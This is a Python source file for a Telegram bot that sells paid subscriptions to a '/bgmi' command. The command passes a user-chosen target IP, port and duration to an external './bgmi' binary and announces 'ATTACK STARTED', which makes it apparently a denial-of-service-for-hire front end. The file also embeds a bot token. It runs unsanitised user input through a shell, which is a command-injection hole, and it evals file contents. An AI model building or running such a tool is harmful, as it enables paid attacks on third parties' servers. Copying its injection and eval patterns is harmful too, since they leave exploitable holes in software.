import telebot
import datetime
import subprocess
import os
from telebot import types

# Replace with your bot token
bot = telebot.TeleBot('5530715010:AAFVAIfT20UKqEOPaegn4UAN2rIXyt0eeoY')

# Admin user IDs
admin_id = {"5506358369"}

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# File to store subscription details
SUBSCRIPTION_FILE = "subscriptions.txt"

# Plans
PLANS = {
    "1DAY": {"duration": 1, "price": 30},
    "7DAYS": {"duration": 7, "price": 80}
}

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

allowed_user_ids = read_users()

def read_subscriptions():
    try:
        with open(SUBSCRIPTION_FILE, "r") as file:
            return eval(file.read())
    except FileNotFoundError:
        return {}

subscriptions = read_subscriptions()

def write_subscriptions():
    with open(SUBSCRIPTION_FILE, "w") as file:
        file.write(str(subscriptions))

def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found."
            else:
                file.truncate(0)
                response = "Logs cleared successfully ✅"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

def notify_admin(user):
    for admin in admin_id:
        bot.send_message(admin, f"New user needs to be authenticated:\nUsername: {user.username}\nID: {user.id}", reply_markup=get_auth_buttons(user.id))

def get_auth_buttons(user_id):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("Authorize", callback_data=f"authorize_{user_id}"))
    markup.add(types.InlineKeyboardButton("Cancel", callback_data=f"cancel_{user_id}"))
    return markup

def get_payment_buttons():
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("Send UserID to Admin", callback_data="send_userid"))
    return markup

def subscription_buttons():
    markup = types.InlineKeyboardMarkup()
    for plan, details in PLANS.items():
        markup.add(types.InlineKeyboardButton(f"{plan} - Rs. {details['price']}", callback_data=f"buy_{plan}"))
    return markup

def subscription_status(user_id):
    if user_id in subscriptions:
        end_date = subscriptions[user_id]["end_date"]
        remaining_days = (end_date - datetime.datetime.now()).days
        return f"Subscription ends in {remaining_days} days"
    else:
        return "No active subscription"

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"User {user_to_add} added successfully 👍."
            else:
                response = "User already exists 🤦‍♂️."
        else:
            response = "Please specify a user ID to add 😒."
    else:
        response = "ONLY OWNER CAN USE."

    bot.reply_to(message, response)

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully 👍."
            else:
                response = f"User {user_to_remove} not found in the list."
        else:
            response = "Please specify a user ID to remove."
    else:
        response = "ONLY OWNER CAN USE."

    bot.reply_to(message, response)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found."
                else:
                    file.truncate(0)
                    response = "Logs cleared successfully ✅"
        except FileNotFoundError:
            response = "Logs are already cleared."
    else:
        response = "ONLY OWNER CAN USE."
    bot.reply_to(message, response)

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found."
        except FileNotFoundError:
            response = "No data found."
    else:
        response = "ONLY OWNER CAN USE."
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found."
                bot.reply_to(message, response)
        else:
            response = "No data found."
            bot.reply_to(message, response)
    else:
        response = "ONLY OWNER CAN USE."
        bot.reply_to(message, response)

@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"🤖Your ID: {user_id}"
    bot.reply_to(message, response)

# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME = 0

@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                response = "You are on cooldown. Please wait before running the /bgmi command again."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert time to integer
            time = int(command[3])  # Convert port to integer
            if time > 181:
                response = "Error: Time interval must be less than 80."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./bgmi {target} {port} {time} 200"
                subprocess.run(full_command, shell=True)
                response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
        else:
            response = "✅ Usage: /bgmi <target> <port> <time>"  # Updated command syntax
    else:
        response = "You are not authorized to use this command."

    bot.reply_to(message, response)

@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    with open(LOG_FILE, "r") as file:
        log_content = file.read()
        if log_content.strip() == "":
            response = "No command logs found."
        else:
            response = log_content
    bot.reply_to(message, response)

@bot.message_handler(commands=['start'])
def handle_start(message):
    user_id = str(message.chat.id)
    user = message.from_user

    if user.username:
        username = "@" + user.username
    else:
        username = f"UserID: {user_id}"

    if user_id not in allowed_user_ids:
        caption = f"{username}, you are not authorized.\nClick 'Send UserID to Admin' to request access."
        markup = get_payment_buttons()
        bot.send_photo(user_id, open('unauthorized.jpg', 'rb'), caption=caption, reply_markup=markup)
    else:
        caption = f"Welcome {username}!\nYour ID: {user_id}\nYou are authorized."
        bot.send_photo(user_id, open('authorized.jpg', 'rb'), caption=caption)
        bot.send_message(user_id, subscription_status(user_id))

    notify_admin(user)

@bot.callback_query_handler(func=lambda call: call.data.startswith('authorize_'))
def authorize_user(call):
    user_id = call.data.split('_')[1]
    allowed_user_ids.append(user_id)
    with open(USER_FILE, "a") as file:
        file.write(f"{user_id}\n")
    bot.send_message(user_id, "You are now authorized to use the bot.")
    bot.send_message(call.message.chat.id, f"User {user_id} has been authorized.")

@bot.callback_query_handler(func=lambda call: call.data.startswith('cancel_'))
def cancel_user(call):
    user_id = call.data.split('_')[1]
    bot.send_message(user_id, "You are not authorized to use the bot.")
    bot.send_message(call.message.chat.id, f"User {user_id}'s authorization has been canceled.")

@bot.callback_query_handler(func=lambda call: call.data.startswith('buy_'))
def buy_subscription(call):
    user_id = str(call.message.chat.id)
    plan = call.data.split('_')[1]
    duration = PLANS[plan]['duration']
    price = PLANS[plan]['price']
    
    caption = f"You have selected the {plan} plan for Rs. {price}.\nPlease make the payment and click 'Payment Done'."
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("Payment Done", callback_data=f"payment_{user_id}_{plan}"))
    bot.send_photo(user_id, open('payment_qr.jpg', 'rb'), caption=caption, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('payment_'))
def handle_payment_done(call):
    user_id, plan = call.data.split('_')[1:]
    bot.send_message(user_id, "Please send a screenshot of the payment and the transaction ID.")
    bot.send_message(admin_id, f"User {user_id} has made a payment for the {plan} plan.\nPlease verify the payment.", reply_markup=get_verify_buttons(user_id, plan))

def get_verify_buttons(user_id, plan):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("Confirm", callback_data=f"confirm_{user_id}_{plan}"))
    markup.add(types.InlineKeyboardButton("Cancel", callback_data=f"cancel_{user_id}_{plan}"))
    return markup

@bot.callback_query_handler(func=lambda call: call.data.startswith('confirm_'))
def confirm_payment(call):
    user_id, plan = call.data.split('_')[1:]
    duration = PLANS[plan]['duration']
    end_date = datetime.datetime.now() + datetime.timedelta(days=duration)
    subscriptions[user_id] = {"plan": plan, "end_date": end_date}
    write_subscriptions()
    bot.send_message(user_id, f"Your subscription for the {plan} plan has been confirmed.\n{subscription_status(user_id)}")
    bot.send_message(call.message.chat.id, f"User {user_id}'s payment for the {plan} plan has been confirmed.")

@bot.callback_query_handler(func=lambda call: call.data.startswith('cancel_'))
def cancel_payment(call):
    user_id, plan = call.data.split('_')[1:]
    bot.send_message(user_id, "Your payment has been canceled.")
    bot.send_message(call.message.chat.id, f"User {user_id}'s payment for the {plan} plan has been canceled.")

@bot.message_handler(commands=['ban'])
def ban_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_ban = command[1]
            if user_to_ban in allowed_user_ids:
                allowed_user_ids.remove(user_to_ban)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_ban} banned successfully 👍."
            else:
                response = f"User {user_to_ban} not found in the list."
        else:
            response = "Please specify a user ID to ban."
    else:
        response = "ONLY OWNER CAN USE."

    bot.reply_to(message, response)

@bot.message_handler(commands=['unban'])
def unban_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_unban = command[1]
            if user_to_unban not in allowed_user_ids:
                allowed_user_ids.append(user_to_unban)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_unban}\n")
                response = f"User {user_to_unban} unbanned successfully 👍."
            else:
                response = f"User {user_to_unban} is already in the allowed list."
        else:
            response = "Please specify a user ID to unban."
    else:
        response = "ONLY OWNER CAN USE."

    bot.reply_to(message, response)

@bot.message_handler(commands=['addadmin'])
def add_admin(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            admin_to_add = command[1]
            admin_id.add(admin_to_add)
            response = f"Admin {admin_to_add} added successfully 👍."
        else:
            response = "Please specify a user ID to add as admin."
    else:
        response = "ONLY OWNER CAN USE."

    bot.reply_to(message, response)

@bot.message_handler(commands=['removeadmin'])
def remove_admin(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            admin_to_remove = command[1]
            if admin_to_remove in admin_id:
                admin_id.remove(admin_to_remove)
                response = f"Admin {admin_to_remove} removed successfully 👍."
            else:
                response = f"Admin {admin_to_remove} not found in the list."
        else:
            response = "Please specify a user ID to remove from admin."
    else:
        response = "ONLY OWNER CAN USE."

    bot.reply_to(message, response)

bot.polling()
